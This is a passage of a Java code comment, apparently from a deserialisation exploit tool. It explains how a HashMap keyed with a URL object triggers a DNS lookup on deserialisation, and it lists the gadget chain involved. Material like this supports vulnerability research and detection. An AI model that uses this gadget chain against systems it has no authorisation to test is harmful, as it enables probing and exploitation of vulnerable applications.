/**
 * A blog post with more details about this gadget chain is at the url below:
 *   https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/
 *
 *   This was inspired by  Philippe Arteau @h3xstream, who wrote a blog
 *   posting describing how he modified the Java Commons Collections gadget
 *   in ysoserial to open a URL. This takes the same idea, but eliminates
 *   the dependency on Commons Collections and does a DNS lookup with just
 *   standard JDK classes.
 *
 *   The Java URL class has an interesting property on its equals and
 *   hashCode methods. The URL class will, as a side effect, do a DNS lookup
 *   during a comparison (either equals or hashCode).
 *
 *   As part of deserialization, HashMap calls hashCode on each key that it
 *   deserializes, so using a Java URL object as a serialized key allows
 *   it to trigger a DNS lookup.
 *
 *   Gadget Chain:
 *     HashMap.readObject()
 *       HashMap.putVal()
 *         HashMap.hash()
 *           URL.hashCode()
 *
